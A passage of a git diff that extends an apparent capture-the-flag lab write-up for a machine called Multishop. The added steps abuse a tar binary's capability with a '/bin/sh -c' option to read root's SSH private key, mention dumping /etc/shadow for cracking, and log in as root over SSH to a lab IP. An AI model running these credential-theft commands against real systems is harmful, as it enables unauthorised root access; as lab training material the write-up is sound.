@@ -96,7 +96,24 @@ Now the payload is successful, because the file can be obtained by the target se
 4.	We move to the bin directory with the command: cd /usr/bin.
 5.	then tar xf “/root/.ssh/id_rsa” -I '/bin/sh -c “cat 1>&2”' then the id_rsa output will come out.
   ![alt text](/assets/images/hacktrace/multishop/image14.png)
-6.	managed to get the credential id_rsa to login to ssh as root without using a password, but we can also see the root password (/etc/shadow) by using this credential capability, but it takes time to decrypt the password and we also don't know what wordlist is used. This is 
+6.	managed to get the credential id_rsa to login to ssh as root without using a password, but we can also see the root password (/etc/shadow) by using this credential capability, but it takes time to decrypt the password and we also don't know what wordlist is used. This is the /etc/shadow file: 
+  ![alt text](/assets/images/hacktrace/multishop/image15.png)
+We see 2 passwords appear, but this takes a long time, so we use id_rsa for ssh login.
+7.	Save the id_rsa that appears then chmod 600 nama_file, the meaning of chmod 600 is that only the file owner can read and write the file, keeping the data safe from unwanted access.
+8.	Then ssh -i nama_file root@10.1.2.140
+9.	Boom, the book can be logged in as the highest access rights root
+  ![alt text](/assets/images/hacktrace/multishop/image16.png)
+
+
+### USER FLAG = user.txt ###
+### ROOT FLAG = root.txt ###
+
+
+
+
+
+
+
 
 
 
